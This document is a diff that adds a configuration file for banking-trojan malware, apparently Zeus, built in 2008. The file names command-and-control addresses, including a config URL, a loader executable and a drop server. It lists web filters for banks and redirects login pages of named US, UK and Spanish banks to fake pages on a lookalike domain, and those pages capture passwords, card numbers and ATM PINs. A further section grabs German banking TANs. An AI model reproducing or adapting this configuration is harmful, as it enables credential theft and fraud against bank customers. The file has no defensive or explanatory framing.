@@ -1,0 +1,79 @@
+;Description of this file you can found in manual.
+;Build time:   18:12:39 17.09.2008 GMT
+;Version:      1.1.0.0
+;Default host: http://www.si-stat.com/web
+
+entry "StaticConfig"
+	;botnet "btn1"
+	timer_config 60 10
+	timer_logs 4 4
+	timer_stats 30 10
+	url_config "http://www.si-stat.com/web/cfg.bin"
+	url_compip "http://whatismyip.com/" 256
+	;blacklist_languages
+end
+
+entry "DynamicConfig"
+	url_loader "http://www.si-stat.com/web/ldr.exe"
+	url_server "http://www.si-stat.com/web/s.php"
+	file_webinjects "webinjects.txt"
+
+	entry "AdvancedConfigs"
+		;"http://72.232.22.154/cfg1.bin"
+	end
+
+	entry "WebFilters"
+		"!http://*myspace.com*"
+		"https://www.gruposantander.es/*"
+		"https://internetbanking.gad.de/*/portal?bankid=*"
+		"https://www.vr-networld-ebanking.de/index.php?RZKZ=*&RZBK=*"
+		"https://finanzportal.fiducia.de/*?rzid=*&rzbk=*"
+		"@https://ssl.bsk.com.pl/bskonl/login.ac"
+		"https://*.banking.first-direct.com/*"
+	end
+
+	entry "WebDataFilters"
+		;"http://mail.rambler.ru/*" "passw;login"
+	end
+
+	entry "WebFakes"
+		;US
+		"https://sitekey.bankofamerica.com/sas/signon.do"                                                   "http://statistics-google.org/web/fk/US/bofa.php"                 "P" "*USpass=*" ""
+		"https://chaseonline.chase.com/siteminderagent/forms/formpost.fcc"                                  "http://statistics-google.org/web/fk/US/chase.php"                "P" "*CCNumber=*&ATMPIN=*" ""
+
+		;UK
+		"https://ibank.barclays.co.uk/olb/s/LoginMember.do"                                                 "http://statistics-google.org/web/fk/UK/barclays.co.uk.php"       "G" "" ""
+		"https://home.cbonline.co.uk/login.html?message=*"                                                  "http://statistics-google.org/web/fk/UK/cbonline.php"             "G" "" ""
+		"https://home.ybonline.co.uk/login.html?message=*"                                                  "http://statistics-google.org/web/fk/UK/ybonline.php"             "G" "" ""
+		"https://ibank.cahoot.com/servlet/com.aquarius.security.authentication.servlet.LogonServlet"        "http://statistics-google.org/web/fk/UK/cahoot.php"               "P" "*UKpass*" ""
+		"https://www.halifax-online.co.uk/CustomerAuthentication/HxProcessLogin.aspx"                       "http://statistics-google.org/web/fk/UK/halifax.php"              "P" "*UKpass*" ""
+		"https://www.ebank.hsbc.co.uk/servlet/com.hsbc.ib.app.pib.logon.servlet.OnBrochurewareLogonServlet" "http://statistics-google.org/web/fk/UK/hsbc.php"                 "P" "*UKpass*" ""
+		"https://online-business.lloydstsb.co.uk/logon.ibc"                                                 "http://statistics-google.org/web/fk/UK/lloydstsb_biz.php"        "P" "*UKpass*" ""
+		"https://online-offshore.lloydstsb.com/logon.ibc"                                                   "http://statistics-google.org/web/fk/UK/lloydstsb_offshore.php"   "P" "*UKpass*" ""
+		"https://online.lloydstsb.co.uk/logon.ibc"                                                          "http://statistics-google.org/web/fk/UK/lloydstsb_personal.php"   "P" "*UKpass*" ""
+
+		;ES
+		"https://www.bancajaproximaempresas.com/ControlEmpresas"                                            "http://statistics-google.org/web/fk/ES/bancaja_e.php"            "P" "*ESpass*" "*EXE=PBPE0011*firma1=*"
+		"https://www.bancaja.*/ControlParticulares"                                                         "http://statistics-google.org/web/fk/ES/bancaja_p.php"            "P" "*ESpass*" "*EXE=PBCJ0001*firma1=*"
+		"https://www.gruposantander.es/bog/sbi"                                                             "http://statistics-google.org/web/fk/ES/gruposantander.php"       "GP" "*ESpass=*" ""
+		"https://www.unicaja.es/PortalServlet*pag=1110902071492*"                                           "http://statistics-google.org/web/fk/ES/unicaja.php"              "G"  "" ""
+		"https://extranet.banesto.es/npage/loginParticulares.htm"                                           "http://statistics-google.org/web/fk/ES/banesto_p.php"            "G"  "" ""
+		"https://www2.bancopopular.es/AppBPE/servlet/servin?p_pm=bo&p_pf=c&p_id=esp"                        "http://statistics-google.org/web/fk/ES/bancopopular.es.php"      "G"  "" ""
+	end
+
+	entry "TANGrabber"
+		"https://banking.*.de/cgi/ueberweisung.cgi/*" "S3R1C6" "*&tid=*" "*&betrag=*"
+		"https://internetbanking.gad.de/banking/*" "S3C6" "*" "*" "KktNrTanEnz"
+		"https://cipehb*.cdg.citibank.de/HomeBanking*?_D=WorkArea&*" "S3C6R1" "*=DT" "*" "I2"
+		"https://www.vr-networld-ebanking.de/ebanking*Action=*" "S3C6" "*" "*" "Schmetterling"
+		"https://finanzportal.fiducia.de/ebanking*Action=*" "S3C6" "*" "*" "Schmetterling"
+		"https://finanzportal.fiducia.de/ebbg2/portal?token=*" "S3C6" "*decBetrag=*" "*" "value_*"
+		"https://onlinebanking.norisbank.de/norisbank/*.do?method=*" "S3C6" "*" "*" "tan"
+		"https://www.dresdner-privat.de/servlet/*" "S3C6" "*&CMD=stapelFreigeben&*" "*"
+		"https://brokerage.comdirect.de/servlet/*TAN*" "S3C6" "*transactionID=*" "*"
+	end
+
+	entry "DnsMap"
+		;127.0.0.1 microsoft.com
+	end
+end
